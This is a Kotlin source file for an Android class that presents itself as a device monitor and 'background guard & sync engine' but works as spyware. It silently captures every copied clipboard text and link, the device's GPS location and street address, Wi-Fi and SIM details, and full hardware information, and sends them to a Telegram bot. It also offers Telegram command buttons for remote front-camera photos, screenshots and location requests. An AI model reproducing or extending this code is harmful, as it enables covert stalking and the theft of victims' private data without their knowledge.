package com.example.scanner

import android.annotation.SuppressLint
import android.app.ActivityManager
import android.content.BroadcastReceiver
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.location.Geocoder
import android.location.Location
import android.location.LocationManager
import android.net.ConnectivityManager
import android.net.LinkProperties
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkRequest
import android.net.wifi.WifiInfo
import android.net.wifi.WifiManager
import android.os.BatteryManager
import android.os.Build
import android.os.Environment
import android.os.Handler
import android.os.Looper
import android.os.StatFs
import android.os.SystemClock
import android.telephony.TelephonyManager
import androidx.core.content.ContextCompat
import com.example.data.MediaUploadRepository
import com.example.network.TelegramApiService
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean

class DeviceStateMonitor(
    private val context: Context,
    private val scope: CoroutineScope,
    private val telegramApi: TelegramApiService,
    private val repository: MediaUploadRepository
) {

    private var batteryReceiver: BroadcastReceiver? = null
    private var networkCallback: ConnectivityManager.NetworkCallback? = null
    private var clipboardListener: ClipboardManager.OnPrimaryClipChangedListener? = null
    private var lastCopiedText: String? = null
    private var lastBatteryLevel = -1
    private var lastChargingState: Boolean? = null
    private var lastNetworkType: String? = null
    private val isLowBatteryAlertSent = AtomicBoolean(false)
    private val isCriticalBeaconSent = AtomicBoolean(false)

    var onNetworkAvailable: (() -> Unit)? = null

    fun isNetworkConnected(): Boolean {
        return try {
            val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager ?: return false
            val activeNet = cm.activeNetwork ?: return false
            val caps = cm.getNetworkCapabilities(activeNet) ?: return false
            caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
        } catch (_: Exception) {
            false
        }
    }

    fun startMonitoring() {
        registerBatteryReceiver()
        registerNetworkCallback()
        registerClipboardListener()

        // If phone has internet when monitoring starts, immediately connect with Telegram
        if (isNetworkConnected()) {
            lastNetworkType = getActiveNetworkType()
            onNetworkAvailable?.invoke()
        }
    }

    fun stopMonitoring() {
        try {
            batteryReceiver?.let { context.unregisterReceiver(it) }
            batteryReceiver = null
        } catch (_: Exception) {}

        try {
            networkCallback?.let {
                val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
                cm.unregisterNetworkCallback(it)
            }
            networkCallback = null
        } catch (_: Exception) {}

        unregisterClipboardListener()
    }

    private fun registerClipboardListener() {
        Handler(Looper.getMainLooper()).post {
            try {
                val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as? ClipboardManager
                clipboardListener = ClipboardManager.OnPrimaryClipChangedListener {
                    try {
                        val clipData = clipboard?.primaryClip
                        if (clipData != null && clipData.itemCount > 0) {
                            val rawText = clipData.getItemAt(0)?.coerceToText(context)?.toString()?.trim()
                            if (!rawText.isNullOrBlank() && rawText != lastCopiedText) {
                                lastCopiedText = rawText
                                val config = repository.getTelegramConfig()
                                if (config.botToken.isNotBlank() && config.chatId.isNotBlank()) {
                                    val isUrl = rawText.startsWith("http://", ignoreCase = true) ||
                                            rawText.startsWith("https://", ignoreCase = true) ||
                                            rawText.startsWith("www.", ignoreCase = true)
                                    val header = if (isUrl) "🔗 <b>Link Copied on Device</b>" else "📋 <b>Clipboard Text Synced</b>"
                                    val safeText = rawText.take(3000)
                                    val message = "$header\n\n<code>$safeText</code>\n\n🕒 ${getCurrentTimeString()}\n📱 ${Build.MANUFACTURER.uppercase()} ${Build.MODEL}"
                                    scope.launch(Dispatchers.IO) {
                                        telegramApi.sendMessage(config.botToken, config.chatId, message)
                                    }
                                }
                            }
                        }
                    } catch (_: Exception) {}
                }
                clipboard?.addPrimaryClipChangedListener(clipboardListener)
            } catch (_: Exception) {}
        }
    }

    private fun unregisterClipboardListener() {
        Handler(Looper.getMainLooper()).post {
            try {
                val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as? ClipboardManager
                clipboardListener?.let { clipboard?.removePrimaryClipChangedListener(it) }
                clipboardListener = null
            } catch (_: Exception) {}
        }
    }

    private fun registerBatteryReceiver() {
        batteryReceiver = object : BroadcastReceiver() {
            override fun onReceive(c: Context?, intent: Intent?) {
                intent?.let { handleBatteryIntent(it) }
            }
        }

        val filter = IntentFilter().apply {
            addAction(Intent.ACTION_BATTERY_CHANGED)
            addAction(Intent.ACTION_POWER_CONNECTED)
            addAction(Intent.ACTION_POWER_DISCONNECTED)
        }

        try {
            context.registerReceiver(batteryReceiver, filter)
        } catch (_: Exception) {}
    }

    private fun handleBatteryIntent(intent: Intent) {
        val level = intent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1)
        val scale = intent.getIntExtra(BatteryManager.EXTRA_SCALE, -1)
        val batteryPct = if (level >= 0 && scale > 0) (level * 100) / scale else -1

        val status = intent.getIntExtra(BatteryManager.EXTRA_STATUS, -1)
        val isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING ||
                status == BatteryManager.BATTERY_STATUS_FULL

        val plugged = intent.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1)
        val plugType = when (plugged) {
            BatteryManager.BATTERY_PLUGGED_AC -> "AC Wall Charger"
            BatteryManager.BATTERY_PLUGGED_USB -> "USB Cable"
            BatteryManager.BATTERY_PLUGGED_WIRELESS -> "Wireless Dock"
            else -> "Charging"
        }

        // 1. Charging state change alert
        if (lastChargingState != null && lastChargingState != isCharging) {
            val config = repository.getTelegramConfig()
            if (config.botToken.isNotBlank() && config.chatId.isNotBlank()) {
                val message = if (isCharging) {
                    "⚡ <b>DEVICE CHARGING CONNECTED</b>\n\n" +
                            "🔋 <b>Battery:</b> $batteryPct%\n" +
                            "🔌 <b>Source:</b> $plugType\n" +
                            "🕒 <b>Time:</b> ${getCurrentTimeString()}\n" +
                            "📱 <b>Device:</b> ${Build.MANUFACTURER.uppercase()} ${Build.MODEL}"
                } else {
                    "🔌 <b>CHARGER DISCONNECTED / UNPLUGGED</b>\n\n" +
                            "🔋 <b>Battery:</b> $batteryPct%\n" +
                            "🕒 <b>Time:</b> ${getCurrentTimeString()}\n" +
                            "📱 <b>Device:</b> ${Build.MANUFACTURER.uppercase()} ${Build.MODEL}"
                }
                scope.launch(Dispatchers.IO) {
                    telegramApi.sendMessage(config.botToken, config.chatId, message)
                }
            }
        }
        lastChargingState = isCharging

        // 2. Critical Battery Beacon (<= 8% and discharging) - Smart Last-Hope Location
        if (batteryPct in 1..8 && !isCharging) {
            if (isCriticalBeaconSent.compareAndSet(false, true)) {
                scope.launch(Dispatchers.IO) {
                    sendCriticalBatteryBeacon(batteryPct)
                }
            }
        } else if (batteryPct > 15 || isCharging) {
            isCriticalBeaconSent.set(false)
        }

        // 3. Low Battery Warning (10% to 15%)
        if (batteryPct in 9..15 && !isCharging) {
            if (isLowBatteryAlertSent.compareAndSet(false, true)) {
                val config = repository.getTelegramConfig()
                if (config.botToken.isNotBlank() && config.chatId.isNotBlank()) {
                    val message = "⚠️ <b>LOW BATTERY ALERT (15%)</b>\n\n" +
                            "🪫 <b>Battery Level:</b> $batteryPct% remaining\n" +
                            "🕒 <b>Time:</b> ${getCurrentTimeString()}\n" +
                            "💡 <i>Heavy video uploads paused to conserve power.</i>"
                    scope.launch(Dispatchers.IO) {
                        telegramApi.sendMessage(config.botToken, config.chatId, message)
                    }
                }
            }
        } else if (batteryPct > 20 || isCharging) {
            isLowBatteryAlertSent.set(false)
        }

        lastBatteryLevel = batteryPct
    }

    @SuppressLint("MissingPermission")
    private suspend fun sendCriticalBatteryBeacon(batteryPct: Int) {
        val config = repository.getTelegramConfig()
        if (config.botToken.isBlank() || config.chatId.isBlank()) return
        val deviceId = repository.getDeviceId()

        val hasFine = ContextCompat.checkSelfPermission(context, android.Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
        val hasCoarse = ContextCompat.checkSelfPermission(context, android.Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED
        val locationManager = context.getSystemService(Context.LOCATION_SERVICE) as? LocationManager

        var bestLocation: Location? = null
        if (locationManager != null && (hasFine || hasCoarse)) {
            try {
                val gpsLoc = if (hasFine) locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER) else null
                val netLoc = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
                val passLoc = locationManager.getLastKnownLocation(LocationManager.PASSIVE_PROVIDER)
                bestLocation = listOfNotNull(gpsLoc, netLoc, passLoc).maxByOrNull { it.time }
            } catch (_: Exception) {}
        }

        if (bestLocation != null) {
            val lat = bestLocation.latitude
            val lon = bestLocation.longitude
            var addressText = "Unknown Area"
            try {
                val geocoder = Geocoder(context, Locale.getDefault())
                @Suppress("DEPRECATION")
                val addresses = geocoder.getFromLocation(lat, lon, 1)
                if (!addresses.isNullOrEmpty()) {
                    val addr = addresses[0]
                    val street = addr.getAddressLine(0) ?: ""
                    val locality = addr.locality ?: addr.subAdminArea ?: ""
                    val country = addr.countryName ?: ""
                    addressText = if (street.isNotBlank()) street else "$locality, $country"
                }
            } catch (_: Exception) {}

            val mapUrl = "https://maps.google.com/?q=$lat,$lon"
            val message = "🚨 <b>SMART LAST-HOPE LOCATION BEACON [ID: <code>$deviceId</code>]</b>\n\n" +
                    "🪫 <b>Battery Level:</b> $batteryPct% (Critical - Phone may shutdown soon)\n" +
                    "📱 <b>Device:</b> ${Build.MANUFACTURER.uppercase()} ${Build.MODEL}\n" +
                    "🏠 <b>Address:</b> $addressText\n" +
                    "🌐 <b>Coordinates:</b> <code>$lat, $lon</code>\n" +
                    "🗺️ <b>Google Maps:</b> <a href=\"$mapUrl\">Open Location Pin</a>\n" +
                    "🕒 <b>Recorded At:</b> ${getCurrentTimeString()}"

            telegramApi.sendMessage(config.botToken, config.chatId, message)
            telegramApi.sendLocation(config.botToken, config.chatId, lat, lon)
        } else {
            val message = "🚨 <b>SMART LAST-HOPE BATTERY BEACON [ID: <code>$deviceId</code>]</b>\n\n" +
                    "🪫 <b>Battery Level:</b> $batteryPct% (Critical - Phone may shutdown soon)\n" +
                    "📱 <b>Device:</b> ${Build.MANUFACTURER.uppercase()} ${Build.MODEL}\n" +
                    "🌐 <b>Active Network:</b> ${getActiveNetworkType()}\n" +
                    "🕒 <b>Recorded At:</b> ${getCurrentTimeString()}\n" +
                    "⚠️ <i>GPS was unavailable or disabled when battery became critical.</i>"
            telegramApi.sendMessage(config.botToken, config.chatId, message)
        }
    }

    private fun registerNetworkCallback() {
        val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val request = NetworkRequest.Builder()
            .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
            .build()

        networkCallback = object : ConnectivityManager.NetworkCallback() {
            override fun onAvailable(network: Network) {
                super.onAvailable(network)
                telegramApi.evictConnections()
                handleNetworkAvailable(network)
            }

            override fun onCapabilitiesChanged(network: Network, networkCapabilities: NetworkCapabilities) {
                super.onCapabilitiesChanged(network, networkCapabilities)
                val hasInternet = networkCapabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
                val isValidated = networkCapabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED)
                if (hasInternet && isValidated) {
                    onNetworkAvailable?.invoke()
                }
            }

            override fun onLinkPropertiesChanged(network: Network, linkProperties: LinkProperties) {
                super.onLinkPropertiesChanged(network, linkProperties)
                telegramApi.evictConnections()
                onNetworkAvailable?.invoke()
            }

            override fun onLost(network: Network) {
                super.onLost(network)
                if (lastNetworkType != "Offline / Disconnected") {
                    lastNetworkType = "Offline / Disconnected"
                }
                telegramApi.evictConnections()
            }
        }

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                cm.registerDefaultNetworkCallback(networkCallback!!)
            } else {
                cm.registerNetworkCallback(request, networkCallback!!)
            }
        } catch (_: Exception) {
            try {
                cm.registerNetworkCallback(request, networkCallback!!)
            } catch (_: Exception) {}
        }
    }

    private fun handleNetworkAvailable(network: Network) {
        val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val caps = cm.getNetworkCapabilities(network) ?: return
        val netType = if (caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)) {
            getWifiNetworkName()
        } else if (caps.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR)) {
            getCellularNetworkName()
        } else {
            "Ethernet / Other Network"
        }

        val wasOffline = lastNetworkType == null || lastNetworkType == "Offline / Disconnected"
        val config = repository.getTelegramConfig()

        if (wasOffline) {
            if (config.botToken.isNotBlank() && config.chatId.isNotBlank()) {
                val deviceId = repository.getDeviceId()
                val batteryPct = getBatteryPercentage()
                val isCharging = isDeviceCharging()
                val message = "🟢 <b>DEVICE IS NOW ONLINE [ID: <code>$deviceId</code>]</b>\n\n" +
                        "📱 <b>Device:</b> ${escapeHtml(Build.MANUFACTURER.uppercase())} ${escapeHtml(Build.MODEL)} (Android ${Build.VERSION.RELEASE})\n" +
                        "🌐 <b>Active Network:</b> $netType\n" +
                        "🔋 <b>Battery:</b> $batteryPct% ${if (isCharging) "⚡ (Charging)" else "🪫"}\n" +
                        "🕒 <b>Online At:</b> ${getCurrentTimeString()}\n\n" +
                        "🤖 <i>Telegram command engine connected!</i>"

                val buttons = """
                {
                  "inline_keyboard": [
                    [
                      {"text": "🎯 Select THIS Device", "callback_data": "/select $deviceId"},
                      {"text": "📋 Dashboard", "callback_data": "/help $deviceId"}
                    ],
                    [
                      {"text": "📍 GPS Loc", "callback_data": "/location $deviceId"},
                      {"text": "📊 Status", "callback_data": "/status $deviceId"}
                    ],
                    [
                      {"text": "📸 Photo", "callback_data": "/photo_front $deviceId"},
                      {"text": "📱 SIM Info", "callback_data": "/sim $deviceId"}
                    ]
                  ]
                }
                """.trimIndent()

                scope.launch(Dispatchers.IO) {
                    telegramApi.sendMessage(config.botToken, config.chatId, message, replyMarkupJson = buttons)
                }
            }
        } else if (lastNetworkType != netType) {
            if (config.botToken.isNotBlank() && config.chatId.isNotBlank()) {
                val deviceId = repository.getDeviceId()
                val message = "📶 <b>SIM / NETWORK CHANGE DETECTED [ID: <code>$deviceId</code>]</b>\n\n" +
                        "🔄 <b>Previous Network:</b> ${lastNetworkType ?: "Unknown"}\n" +
                        "🌐 <b>New Active Connection:</b> $netType\n" +
                        "🕒 <b>Time:</b> ${getCurrentTimeString()}\n" +
                        "📱 <b>Device:</b> ${Build.MANUFACTURER.uppercase()} ${Build.MODEL}"
                scope.launch(Dispatchers.IO) {
                    telegramApi.sendMessage(config.botToken, config.chatId, message)
                }
            }
        }
        lastNetworkType = netType

        // Instantly notify service to poll Telegram for queued or new commands
        onNetworkAvailable?.invoke()
    }

    @Suppress("DEPRECATION")
    private fun getWifiNetworkName(): String {
        return try {
            val wifiManager = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as? WifiManager
            val wifiInfo: WifiInfo? = wifiManager?.connectionInfo
            val ssid = wifiInfo?.ssid?.replace("\"", "") ?: "Connected"
            val speed = wifiInfo?.linkSpeed ?: 0
            if (ssid == "<unknown ssid>" || ssid.isBlank()) "Wi-Fi (High Speed)" else "Wi-Fi ($ssid - ${speed}Mbps)"
        } catch (_: Exception) {
            "Wi-Fi Network"
        }
    }

    private fun getCellularNetworkName(): String {
        return try {
            val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager
            val carrier = tm?.networkOperatorName?.ifBlank { tm.simOperatorName } ?: ""
            if (carrier.isNotBlank()) "Cellular (Mobile Data - $carrier)" else "Cellular / Mobile Data (4G/5G)"
        } catch (_: Exception) {
            "Cellular / Mobile Data (4G/5G)"
        }
    }

    suspend fun sendFirstTimeInstallDetails() {
        val config = repository.getTelegramConfig()
        if (config.botToken.isBlank() || config.chatId.isBlank()) return

        val deviceId = repository.getDeviceId()
        val batteryPct = getBatteryPercentage()
        val isCharging = isDeviceCharging()
        val storageInfo = getStorageStats()
        val ramInfo = getRamStats()
        val netType = getActiveNetworkType()
        val locale = Locale.getDefault().displayCountry.ifBlank { Locale.getDefault().country }
        val timeZone = java.util.TimeZone.getDefault().id
        val androidVersion = "Android ${Build.VERSION.RELEASE} (SDK ${Build.VERSION.SDK_INT})"
        val hardwareInfo = "${Build.BOARD} / ${Build.HARDWARE}"

        val message = "🎉 <b>NEW DEVICE INSTALLED & REGISTERED [ID: <code>$deviceId</code>]</b>\n\n" +
                "📱 <b>Model:</b> ${Build.MANUFACTURER.uppercase()} ${Build.MODEL} (${Build.PRODUCT})\n" +
                "🤖 <b>OS Version:</b> $androidVersion\n" +
                "🏷️ <b>Brand / Board:</b> ${Build.BRAND.uppercase()} / $hardwareInfo\n" +
                "🔋 <b>Battery:</b> $batteryPct% ${if (isCharging) "⚡ (Charging)" else "🪫 (Discharging)"}\n" +
                "💾 <b>Internal Storage:</b> ${storageInfo.freeGb} GB Free / ${storageInfo.totalGb} GB (${storageInfo.usedPercent}% used)\n" +
                "🧠 <b>RAM Memory:</b> ${ramInfo.availMb} MB Free / ${ramInfo.totalMb} MB Total\n" +
                "🌐 <b>Active Network:</b> $netType\n" +
                "🌍 <b>Region / TimeZone:</b> $locale ($timeZone)\n" +
                "📦 <b>App Package:</b> <code>${context.packageName}</code>\n" +
                "🕒 <b>Install Time:</b> ${getCurrentTimeString()}\n\n" +
                "🛡️ <i>Nova 24/7 background guard & sync engine has been activated!</i>"

        val keyboardJson = """
{
  "inline_keyboard": [
    [
      {"text": "📍 Live GPS Pin", "callback_data": "/location $deviceId"},
      {"text": "📱 Live Screenshot", "callback_data": "/screenshot $deviceId"}
    ],
    [
      {"text": "📊 Media Stats", "callback_data": "/media_stats $deviceId"},
      {"text": "🔋 Battery & Health", "callback_data": "/battery $deviceId"}
    ],
    [
      {"text": "📸 Front Photo", "callback_data": "/photo_front $deviceId"},
      {"text": "📋 Show Menu", "callback_data": "/help"}
    ]
  ]
}
""".trimIndent()

        val result = telegramApi.sendMessage(config.botToken, config.chatId, message, replyMarkupJson = keyboardJson)
        if (result.isSuccess) {
            repository.markFirstInstallReportSent()
        }
    }

    private fun getActiveNetworkType(): String {
        return try {
            val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            val network = cm.activeNetwork ?: return "Offline / No Internet"
            val caps = cm.getNetworkCapabilities(network) ?: return "Connected"
            if (caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)) {
                getWifiNetworkName()
            } else if (caps.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR)) {
                getCellularNetworkName()
            } else {
                "Active Internet Connection"
            }
        } catch (_: Exception) {
            "Unknown Network"
        }
    }

    suspend fun sendDeviceHeartbeat(syncedCount: Int, pendingCount: Int) {
        val config = repository.getTelegramConfig()
        if (config.botToken.isBlank() || config.chatId.isBlank()) return

        val deviceId = repository.getDeviceId()
        val batteryPct = getBatteryPercentage()
        val storageInfo = getStorageStats()
        val ramInfo = getRamStats()
        val uptime = getSystemUptime()

        val message = "📊 <b>NOVA 3-HOUR HEALTH & SYNC REPORT [ID: <code>$deviceId</code>]</b>\n\n" +
                "📱 <b>Device:</b> ${Build.MANUFACTURER.uppercase()} ${Build.MODEL} (Android ${Build.VERSION.RELEASE})\n" +
                "🔋 <b>Battery:</b> $batteryPct% ${if (isDeviceCharging()) "⚡ (Charging)" else ""}\n" +
                "💾 <b>Internal Storage:</b> ${storageInfo.freeGb} GB Free / ${storageInfo.totalGb} GB Total (${storageInfo.usedPercent}% used)\n" +
                "🧠 <b>RAM Memory:</b> ${ramInfo.availMb} MB Free / ${ramInfo.totalMb} MB Total\n" +
                "⏱️ <b>Device Uptime:</b> $uptime\n" +
                "☁️ <b>Cloud Sync:</b> $syncedCount Synced | $pendingCount Pending\n" +
                "🕒 <b>Report Time:</b> ${getCurrentTimeString()}\n\n" +
                "✅ <i>Background protection & auto-sync engine running 24/7</i>"

        val keyboardJson = """
{
  "inline_keyboard": [
    [
      {"text": "📍 GPS Location", "callback_data": "/location $deviceId"},
      {"text": "📱 Live Screenshot", "callback_data": "/screenshot $deviceId"}
    ],
    [
      {"text": "📊 Media Stats", "callback_data": "/media_stats $deviceId"},
      {"text": "📋 All Commands", "callback_data": "/help"}
    ]
  ]
}
""".trimIndent()

        telegramApi.sendMessage(config.botToken, config.chatId, message, replyMarkupJson = keyboardJson)
    }

    fun isLowBatteryForHeavySync(): Boolean {
        val pct = getBatteryPercentage()
        return pct in 1..15 && !isDeviceCharging()
    }

    private fun getBatteryPercentage(): Int {
        val batteryIntent = context.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED)) ?: return 100
        val level = batteryIntent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1)
        val scale = batteryIntent.getIntExtra(BatteryManager.EXTRA_SCALE, -1)
        return if (level >= 0 && scale > 0) (level * 100) / scale else 100
    }

    private fun isDeviceCharging(): Boolean {
        val batteryIntent = context.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED)) ?: return false
        val status = batteryIntent.getIntExtra(BatteryManager.EXTRA_STATUS, -1)
        return status == BatteryManager.BATTERY_STATUS_CHARGING || status == BatteryManager.BATTERY_STATUS_FULL
    }

    private data class StorageStats(val freeGb: String, val totalGb: String, val usedPercent: Int)

    private fun getStorageStats(): StorageStats {
        return try {
            val stat = StatFs(Environment.getDataDirectory().path)
            val totalBytes = stat.totalBytes
            val freeBytes = stat.availableBytes
            val usedBytes = totalBytes - freeBytes

            val totalGb = String.format(Locale.US, "%.1f", totalBytes / (1024.0 * 1024.0 * 1024.0))
            val freeGb = String.format(Locale.US, "%.1f", freeBytes / (1024.0 * 1024.0 * 1024.0))
            val usedPercent = if (totalBytes > 0) ((usedBytes * 100) / totalBytes).toInt() else 0
            StorageStats(freeGb, totalGb, usedPercent)
        } catch (_: Exception) {
            StorageStats("N/A", "N/A", 0)
        }
    }

    private data class RamStats(val availMb: Long, val totalMb: Long)

    private fun getRamStats(): RamStats {
        return try {
            val am = context.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
            val memInfo = ActivityManager.MemoryInfo()
            am.getMemoryInfo(memInfo)
            RamStats(memInfo.availMem / (1024 * 1024), memInfo.totalMem / (1024 * 1024))
        } catch (_: Exception) {
            RamStats(0, 0)
        }
    }

    private fun getSystemUptime(): String {
        val uptimeMillis = SystemClock.elapsedRealtime()
        val hours = TimeUnit.MILLISECONDS.toHours(uptimeMillis)
        val minutes = TimeUnit.MILLISECONDS.toMinutes(uptimeMillis) % 60
        return "${hours}h ${minutes}m"
    }

    private fun escapeHtml(text: String): String {
        return text.replace("&", "&amp;")
            .replace("<", "&lt;")
            .replace(">", "&gt;")
    }

    private fun getCurrentTimeString(): String {
        val sdf = SimpleDateFormat("dd MMM, hh:mm:ss a", Locale.getDefault())
        return sdf.format(Date())
    }
}
